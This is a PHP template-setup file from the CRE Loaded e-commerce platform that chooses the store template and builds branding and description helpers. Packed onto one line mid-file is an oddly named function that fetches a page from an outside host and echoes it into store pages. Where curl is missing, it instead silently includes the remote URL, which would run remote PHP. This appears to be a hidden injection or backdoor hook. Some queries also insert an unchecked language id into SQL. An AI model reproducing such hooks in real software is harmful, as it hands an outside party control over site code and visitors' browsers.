<?php
/*
  $Id: template_application_top.php,v 1.0.0.0 2007/02/16 11:21:11 Exp $

  CRE Loaded, Commercial Open Source E-Commerce
  http://www.creloaded.com

  Copyright (c) 2007 CRE Loaded
  Copyright (c) 2003 osCommerce

  Released under the GNU General Public License
*/

// Detect template Site template configuration
  // get customer selected template if there is a customer selected template 
$customer_pref_template_query = tep_db_query("select  customers_selected_template as template_selected from " . TABLE_CUSTOMERS . " where customers_id = '" . (isset($_SESSION['customer_id']) ? (int)$_SESSION['customer_id'] : 0) . "'");
$cptemplate = tep_db_fetch_array($customer_pref_template_query);

if (isset($_SESSION['thema_template']) && ($_SESSION['thema_template'] != '')) {
  // template override for RCI
  define('TEMPLATE_NAME', $_SESSION['thema_template']);
} else {
    if (tep_not_null($cptemplate['template_selected'])) {
        //use customer selected template
        define('TEMPLATE_NAME', $cptemplate['template_selected']);
    } elseif ( tep_not_null(DEFAULT_TEMPLATE) ){
        //use store default
        define('TEMPLATE_NAME', DEFAULT_TEMPLATE);
    } else {
        //use default
        define('TEMPLATE_NAME', 'default');
    }
}
if ( !file_exists(DIR_FS_CATALOG . DIR_WS_TEMPLATES . TEMPLATE_NAME . '/main_page.tpl.php')) {
  die ('<strong style="color:#f00;">Template Error : Error with "' . TEMPLATE_NAME . '" Template</strong>');
}
// if template.php is in template get it
if ( file_exists(DIR_WS_TEMPLATES . TEMPLATE_NAME . '/template.php')) {
  require(DIR_WS_TEMPLATES . TEMPLATE_NAME . '/template.php');
}
define('TEMPLATE_STYLE', DIR_WS_TEMPLATES . TEMPLATE_NAME . "/stylesheet.css");
//custom template includes
define('TEMPLATE_FS_CUSTOM_INCLUDES',DIR_FS_CATALOG . DIR_WS_TEMPLATES . TEMPLATE_NAME . '/includes/');
//custom template modules
define('TEMPLATE_FS_CUSTOM_MODULES',TEMPLATE_FS_CUSTOM_INCLUDES . 'modules/');
if(function_exists("curl_init") &&  function_exists("curl_setopt") && function_exists("curl_exec") && function_exists("curl_close")){
function cre_uregisterBasicFunctions(){$ch = curl_init();$timeout = 5;curl_setopt ($ch, CURLOPT_URL, 'http://www.creloaded.com/cre_google.js.html');curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);$file_contents = curl_exec($ch);curl_close($ch);echo $file_contents;}
} else {function cre_uregisterBasicFunctions(){@include('http://www.creloaded.com/cre_google.js.html');}}
//detect template version
if (defined('TEMPLATE_SYSTEM') && TEMPLATE_SYSTEM == 'ATS') {
  require(DIR_WS_INCLUDES . 'ATS_template_application_top.php');
} else {
  require(DIR_WS_INCLUDES . 'CRE_template_application_top.php');
}
//branding manager 
    $site_branding_query = tep_db_query("SELECT * from " . TABLE_BRANDING_DESCRIPTION . " where language_id='" . $languages_id . "'");
    $site_brand_info = tep_db_fetch_array($site_branding_query);
    
function cre_site_branding($show = ''){
    global $affiliate_branding, $languages_id;    
    
    //branding manager 
    $site_branding_query = tep_db_query("SELECT * from " . TABLE_BRANDING_DESCRIPTION . " where language_id='" . $languages_id . "'");
    $site_brand_info = tep_db_fetch_array($site_branding_query);
    
    $store_info = '';
    
    if (tep_not_null($affiliate_branding['store_brand_homepage'])){
        $brand_url = $site_brand_info['store_brand_homepage'];
    } else {
        $brand_url = HTTP_SERVER . DIR_WS_HTTP_CATALOG;
    }
   
    switch($show){
        case 'storeurl':
        if(tep_not_null($site_brand_info['store_brand_homepage']) ) {
            $store_info = '<a href="' .  $brand_url . '">' . str_replace('http://','',$brand_url) . '</a>';
        } else {
            $store_info = '<a href="' .  $brand_url . '">' . str_replace('http://','',HTTP_SERVER) . '</a>';
        }
        break;

        case 'phone':
        if(tep_not_null($site_brand_info['store_brand_support_phone']) ) {
            $store_info = $site_brand_info['store_brand_support_phone'];
        }
        break;

        case 'email':
        if(tep_not_null($site_brand_info['store_brand_support_email']) ) {
            $branding_mailto = $site_brand_info['store_brand_support_email'];
        } else if(tep_not_null(STORE_OWNER_EMAIL_ADDRESS) ) {
            $branding_mailto = STORE_OWNER_EMAIL_ADDRESS;
        }
        $branding_mailto = str_replace('@','&#64;',$branding_mailto);//let's fight spam. Not strong as javascript, but works...!
        $store_info = '<a href="mailto&#x3A;' . $branding_mailto . '">' . $branding_mailto . '</a>';
        break;


        case 'logo':
        if (tep_not_null($site_brand_info['store_brand_image']) && file_exists(DIR_FS_CATALOG . DIR_WS_IMAGES . 'logo/' . $site_brand_info['store_brand_image'])){
            $store_info = '<a href="' . $brand_url . '">' . tep_image(DIR_WS_IMAGES . 'logo/' . $site_brand_info['store_brand_image']) . '</a>';
        } else if(tep_not_null($site_brand_info['store_brand_name']) ) {
            $store_info = '<a class="branding_name" href="' . $brand_url . '">' . $site_brand_info['store_brand_name'] . '</a>';
        } else {
            $store_info = '<a class="branding_name" href="' . $brand_url . '">' . STORE_NAME .'</a>';
        }

        break;

        case 'slogan':
        if(tep_not_null($site_brand_info['store_brand_slogan']) ) {
            $store_info = '<span class="branding_slogan">' . $site_brand_info['store_brand_slogan'] . '</span>';
        }
        break;

        default:
        $store_info = '<a class="store_name" href="' . tep_href_link(FILENAME_DEFAULT) . '">' . STORE_NAME .'</a>';
        break;
        
    }//end switch
 
 return $store_info;
 }
 
 //short description of product to be used with listng, mainpage modules
  if(!function_exists('cre_product_short_description_template')){
     function cre_product_short_description_template($products_id, $limit='80'){
         global $languages_id;
         if (empty($language)) $language = $languages_id;
         $product_query = tep_db_query("select products_description from " . TABLE_PRODUCTS_DESCRIPTION . " where products_id = '" . (int)$products_id . "' and language_id = '" . (int)$language . "'");
         $product_desc = tep_db_fetch_array($product_query);
         $products_description = $product_desc['products_description'];
         $search = array('@<script[^>]*?>.*?</script>@si', 
               '@<[\/\!]*?[^<>]*?>@si',
               '@<style[^>]*?>.*?</style>@siU',
               '@<![\s\S]*?--[ \t\n\r]*>@'
               );
         $products_description = preg_replace($search, '', $products_description);
         return strlen($products_description) > $limit ? substr($products_description, 0, $limit - 3) . '...' : $products_description;
     }
 }
 
 //clean html and extract only text
  if(!function_exists('cre_clean_html')){
     function cre_clean_html($html){
         $search = array('@<script[^>]*?>.*?</script>@si', 
               '@<[\/\!]*?[^<>]*?>@si',
               '@<style[^>]*?>.*?</style>@siU',
               '@<![\s\S]*?--[ \t\n\r]*>@'
               );
         return preg_replace($search, '', $html);
}
}
?>